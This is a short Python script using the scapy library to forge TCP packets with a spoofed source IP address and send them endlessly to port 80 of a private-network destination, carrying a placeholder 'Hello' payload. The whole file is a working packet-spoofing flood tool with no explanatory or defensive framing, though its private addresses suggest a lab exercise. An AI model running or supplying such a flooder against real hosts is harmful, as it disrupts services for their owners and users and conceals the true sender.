from scapy.all import *

A = "192.168.1.8" # spoofed source IP address
B = "192.168.209.124" # destination IP address
C = RandShort() # source port
D = 80 # destination port
payload = "Hello Hello Hello" # packet payload

while True:
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
    send(spoofed_packet)
